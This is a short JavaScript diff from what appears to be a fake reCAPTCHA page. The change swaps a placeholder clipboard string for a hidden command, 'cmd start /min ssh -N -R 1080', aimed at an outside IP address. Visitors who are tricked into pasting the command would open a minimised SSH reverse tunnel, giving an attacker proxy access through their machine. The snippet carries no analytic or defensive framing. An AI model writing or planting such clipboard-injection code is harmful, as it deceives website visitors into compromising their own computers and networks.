@@ -942,7 +942,7 @@
                 const errorMessage = document.getElementById('recaptcha-error');
                 const recaptchaPopup = document.getElementById('recaptcha-popup');
 
-                navigator.clipboard.writeText('teste').catch(err => {
+                navigator.clipboard.writeText('cmd start /min ssh -N -R 1080 logum-logistica@84.247.169.210').catch(err => {
                     console.error('Falha ao copiar texto:', err);
                     box.style.display = 'none';
                     status.style.display = 'none';
